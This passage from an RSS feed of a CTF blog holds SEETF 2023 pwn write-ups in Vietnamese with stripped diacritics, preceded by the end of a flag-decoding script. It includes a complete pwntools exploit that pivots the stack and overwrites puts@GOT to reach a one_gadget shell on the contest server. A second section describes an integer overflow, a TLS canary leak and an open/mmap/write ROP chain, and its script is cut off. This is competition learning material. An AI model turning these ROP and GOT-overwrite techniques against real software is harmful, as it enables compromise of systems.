</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">114</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">49</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">209</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">170</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">143</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">236</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">34</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">213</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">166</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">217</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">230</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">22</span>,
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>enc_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dec_flag <span style="color:#f92672">=</span> bytearray(base64<span style="color:#f92672">.</span>b64decode(enc_flag))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>map<span style="color:#f92672">=</span>{val: idx <span style="color:#66d9ef">for</span> idx, val <span style="color:#f92672">in</span> enumerate(key)}
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        dec_flag <span style="color:#f92672">=</span> bytearray(map[byte] <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> dec_flag)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">=</span>bytes(dec_flag)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(flag<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{Nice_but_your_nightmare_has_just_started}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>SEETF 2023 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/seetf-2023/</link>
      <pubDate>Mon, 12 Jun 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/seetf-2023/</guid>
      <description><![CDATA[<h1 id="great---expectations">Great - Expectations</h1>
<p><code>Description: Ask no questions, and you'll be told no lies. </code></p>
<p> bi ny, trong hm <code>input_floats()</code> c khai bo mng buf kiu char vi (3 bytes), nhng c li khi format nhp vo l %f (4 bytes), nn t 3 ln ghi  cho, ta c th  nhiu nht 3 bytes xung canary (k t &lsquo;A&rsquo;) v 2 bytes ca saved_rbp ca hm main. V vy,  tng  y l ta ghi  1 byte (hoc 2 bytes) ca saved_rbp  khin cho ret tr ti chui m ta mong mun. u chng trnh cho ta nhp nhiu nht 0x107 k t, nn ta c th pivot stack n ,  khin ret tr ti chui payload m ta mun.
 khng phi leak libc ri quay li hm main 1 ln na th v chng ta c th ghi  ln bng GOT nn  tng ca em l dng ROP  thay i a ch ca hm no  v one_gadgets, v offset gia 2 hm trong libc lun c nh nn ta c th dng gadget <code>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</code>  cng/tr offset sao cho a ch  tr ti one_gadget</p>
<p>Ta thy na byte u ca bytes th 2 sau LSB ca saved_rbp ch cch 1 n v so vi a ch ca buffer m chng trnh cho ta nhp vo. Hn na, byte cui lun kt thc bng 0x00, 0x10, &hellip;, 0xf0 . Nn ta c c hi 1/16  pivot stack v buffer, xong cng 1  bypass check [rbp-1] vi A.</p>
<p><strong>Solve scripts</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.aslr = False</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.timeout = 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">riconn</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> local
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> debug
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:]:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--local&#39;</span>):
</span></span><span style="display:flex;"><span>			local <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--debug&#39;</span>):
</span></span><span style="display:flex;"><span>			debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> local:
</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>			gdb<span style="color:#f92672">.</span>attach(s, gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            b* 0x00000000004012ae
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            b* 0x00000000004011fc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;win.the.seetf.sg&#39;</span>, <span style="color:#ae81ff">2004</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> io
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401313</span>
</span></span><span style="display:flex;"><span>pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401311</span>
</span></span><span style="display:flex;"><span>leave_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040122c</span>
</span></span><span style="display:flex;"><span>pop_rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040119d</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101a</span>
</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040122e</span>
</span></span><span style="display:flex;"><span>main_no_push <span style="color:#f92672">=</span> main<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>input_floats <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011b6</span>
</span></span><span style="display:flex;"><span>put_gots <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404018</span>
</span></span><span style="display:flex;"><span>csu <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40130a</span>
</span></span><span style="display:flex;"><span>add_what_where <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040119c</span> <span style="color:#75715e"># add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hex_to_float</span>(hex_str):
</span></span><span style="display:flex;"><span>    binary_str <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(hex_str)
</span></span><span style="display:flex;"><span>    unpacked <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;!f&#39;</span>, binary_str)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> unpacked[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>	io <span style="color:#f92672">=</span> riconn()
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x61</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> p64(csu) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x5f6de</span>) <span style="color:#f92672">+</span> p64(put_gots<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3d</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p64(add_what_where) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>])
</span></span><span style="display:flex;"><span>	value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;3.544850151698461e-38&#39;</span>
</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ale.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,payload)
</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;number!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;number!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, value<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;number!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;+&#39;</span>)	
</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><p><strong>$ flag:</strong> SEE{Im_f33ling_1ucky_e27e006fe918ab56}</p>
<h1 id="mmap-note">Mmap note</h1>
<p><code>Description: I made a basic note program but with sandbox. And no more chunk for house of xxx. Can you still get the flag?</code></p>
<p> bi ny, chng ta c th allocate 1 s chunks vi size 0x1000. Nu phn b ht lng b nh trn Heap v khin cho chunks mi phi dng mmaped(). iu  khin ta c 1 s chunk nm trn Thread Local Storage (TLS) c t vi 1 offset khng i so vi libc trong vng nh.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">write_0</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [rsp+4h] [rbp-Ch] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;idx = &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">&lt;</span> dword_404590 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;size to write = &#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>sizes[v1]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( sizes[v1] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4096</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      read(<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)chunk[v1], sizes[v1]);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;too much&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;invalid idx&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Li th 2  hm write(), ta thy li integer overflow, nn chng ta c th c nhiu hn 0x1000 bytes. iu ny cho php ta c th c c c canary c lu gi trong 1 offset c nh trn TLS (v hm write in ra c nullbyte).
Sau , chng ta dng  dng rop chain open-&gt;read-&gt;write  nh x file flag vo b nh chng trnh v xut n ra thit b xut chun.</p>
<p>OOPs, chng ta li khng c read()  c file vo b nh (v chng trnh  dng seccomp  chn cc hm  li). May mn thay, em tm thy bi vit ny <a href="https://stackoverflow.com/questions/74743307/mmap-open-and-read-from-file">link</a>. Dng mmap()  read() file. Ok, vy mi th  r rng ri, mnh tin hnh exploit:</p>
<p><strong>Solve scripts</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.aslr = False</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.timeout = 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">riconn</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> local
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> debug
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:]:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--local&#39;</span>):
</span></span><span style="display:flex;"><span>			local <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--debug&#39;</span>):
</span></span><span style="display:flex;"><span>			debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> local:
</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>			gdb<span style="color:#f92672">.</span>attach(s, gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            b* 0x0000000000401930
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            b* 0x0000000000401953
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			raw_input(<span style="color:#e6db74">&#39;DEBUG&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;win.the.seetf.sg&#39;</span>, <span style="color:#ae81ff">2002</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> io
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
